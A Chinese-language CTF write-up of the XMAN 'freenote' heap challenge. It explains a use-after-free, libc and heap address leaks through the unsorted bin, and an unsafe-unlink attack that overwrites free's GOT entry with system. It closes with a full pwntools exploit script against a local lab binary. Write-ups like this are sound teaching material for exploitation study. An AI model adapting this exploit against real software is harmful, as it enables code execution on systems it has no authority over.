---
title: Xman Freenote
date: 2018-08-24 08:37:40
tags: [CTF, PWN]
categories: XMAN夏令营
---
## xman夏令营 freenote
​	这道题做了一天半，最后终于搞出来了。有很多细节需要注意下。  
<!--more-->
拿到题目看是freenote肯定就是个堆题，也没看保护直接ida一波走起，大略的看了一下很快发现了漏洞，在delete函数中free掉chunk后没有在chunk list对应的index中置null，导致有个野指针指向了free chunk。  
	一个野指针能做什么，一开始想的是能否通过double free造一个任意地址写，不过发现这题没有溢出，而且它的new函数中规定你malloc的chunk大小必须为0x80的整数，这样连fastbin都没有了，所以干脆放弃了fastbin attack的思路。  
接着想0x80的整数倍，那么它free的时候会先放到unsorted bin中，chunk的fd和bk会指向main_arena，此时如果我们再new一个8字节的padding，因为不是0x80的倍数，所以默认分配0x80大小的chunk，覆盖原来free掉的chunk，就可以泄露main_arena的值，也就是原free chunk的bk（其实最后一个字节是固定的，也可以泄露fd）。一旦我们get到unsorted bin的表头地址，因为偏移固定，所以我们可以计算出libc基址，这样的话system和binsh等一些东西的地址就知道了。  
接下来就是解题的关键所在，知道libc后我们该如何继续去做，看一下edit函数，发现它的逻辑是如果新的输入长度大小原来的输入长度，就会在新的位置realloc一个chunk，如果小于原来的长度才能覆盖原来的chunk。好像也没啥问题，反正就是不能溢出，直接改free chunk的fd和bk不现实，这时候考虑到使用unlink，通过伪造fake chunk来修改chunk list中的值，最后利用edit函数进行修改，很完美，应该就是这种思路。   
	得知要利用unlink的时候可以想到，首先要知道目标fd和bk的地址，这里由于chunk list是构造在堆上的，所以地址需要泄露，如何泄露，还是unsorted bin，和泄露libc一样的思路，只不过这里需要malloc 4个chunk，delete两个chunk使之有对应的fd和bk，而且delete chunk的顺序需要注意下，防止top chunk从后面进行合并。这样的话我们第一个chunk的指针就能泄露了。由于程序在一开始malloc了一个0x1810大小的chunk，所以偏移可以说是固定的，得到的first allocated chunk的堆地址减去0x1810后得到的就是chunk list  ptr的地址了。  
	最后考虑unlink，需要注意的是之前每次泄露之后都需要清理下chunk，让top进行合并，否则堆结构被破坏会报一些奇怪的错。  
	unlink这里的操作是先malloc一个大一点的chunk，可以是0x80*2或0x80*3，然后在这块大的chunk中构造两个正常的0x80大小的chunk，一个fake chunk，一个正常chunk，这里由于是在一个堆快内，所以元数据可以任意进行构造，构造完成之后delete第二个堆快，因为chunk list中的指针并没有置null，所以这里可以free掉第二个chunk构造unlink。  
	unlink的时候会有检查，包括size和fd、bk，p->size==(p->nextchunk).prevsize,p==(p->fd)->bk,p==(p->bk)->fd,基本就这样，这个可以根据chunk list的堆结构比划一下，应该不难构造。  
unlink完成后chunk list就能写了，使用程序自带的edit函数先把free got写入，之后再次edit写system。一开始想的是写atoi，但是atoi在edit中有使用，所以就去写free got了，这里应该也可以one_gadget，待会再试一下。  
	总的来说这道题还是有点烦的，当然也是我水平不够，没有一眼就看出如何利用，导致审洞+写exp花了很长时间，继续加油吧。

```
from pwn import *
p=process('./freenote')
elf=ELF('./freenote')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(p,'''
#	break *0x00000000004010A8
#	continue
#''')

def add(x):
	p.recvuntil('Your choice: ')
	p.sendline('2')
	p.recvuntil('Length of new note: ')
	p.sendline(str(len(x)))
	p.recvuntil('Enter your note: ')
	p.sendline(x)

def show():
	p.recvuntil('Your choice: ')
	p.sendline('1')

def edit(x,y):
    p.recvuntil("Your choice: ")
    p.send("3\n")
    p.recvuntil("Note number: ")
    p.send(str(x)+"\n")
    p.recvuntil("Length of note: ")
    p.send(str(len(y))+"\n")
    p.recvuntil("Enter your note: ")
    p.send(y)


def dele(idx):
	p.recvuntil('Your choice: ')
	p.sendline('4')
	p.recvuntil('Note number: ')
	p.sendline(str(idx))

#leak the libc
add('a'*0x80)
add('b'*0x80)
dele(0)
add('\x78')
show()
p.recvuntil('0. ')
#main_arena=p.recv(6)[::-1]
main_arena=u64(p.recv(6).ljust(8,'\x00'))
log.info('main_arena > '+hex(main_arena))
libc_base=main_arena-0x3c4b78
log.info('libc_base > '+hex(libc_base))
system_address=libc_base+libc.symbols['system']
binsh_address=libc_base+libc.search('/bin/sh').next()
log.info('system_address > '+hex(system_address))
log.info('binsh_address > '+hex(binsh_address))

dele(1)
dele(0)   #top chunk merge

#leak the chunk list ptr
add('a'*0x80) #0
add('b'*0x80)
add('c'*0x80) #2
add('d'*0x80)
dele(2)
dele(0)
add('A'*8)
show()
p.recvuntil('0. AAAAAAAA')
heap_address=(u64(p.recv(4).ljust(8,'\x00')))
heap=heap_address-0x1810
#print hex(heap_address)
log.info('heap_chunk_ptr > '+hex(heap))
dele(3)
dele(0)
dele(1) #clear the chunk / top chunk merge

#unlink
#add(0x80*'a')
#add(0x80*'b')
#add(0x80*'c')
#dele(2)
#dele(1)
#dele(0) #top chunk merge / convert is ok
payload=(p64(0)+p64(0x81)+p64(heap+0x8)+p64(heap+0x10)+'0'*0x60+p64(0x80)+p64(0x90)+'1'*0x80)+p64(0)+p64(0x80+0x11)+"1"*(0x80-0x20)
add(payload)
log.info('heap > '+hex(heap))
dele(1)
atoi_address=elf.got['atoi']
log.info('atoi_got > '+hex(atoi_address))
#log.info('heap > '+hex(heap))
'''
#p.sednline(p64(0x0)+p64(1)+p64(0x80)+p64(system_address))
payload2=p64(0x80)+p64(1)+p64(0x8)+ p64(atoi_address)+"A"*16+p64(binsh_address)
payload2+="A"*(0x60*3-len(payload2))
edit(0,payload2)
edit(0,p64(system_address))
p.recvuntil("Your choice: ")
p.sendline('/bin/sh\x00')  #edit function used atoi so you could not write atoi got
'''
free_got = 0x602018
payload2 = p64(0x80) + p64(1) + p64(0x8) + p64(free_got) + "A"*16 + p64(binsh_address)
payload2 += "A"* (0x80*3-len(payload2))
edit(0, payload2)
edit(0, p64(system_address))
dele(1)
p.interactive()

```

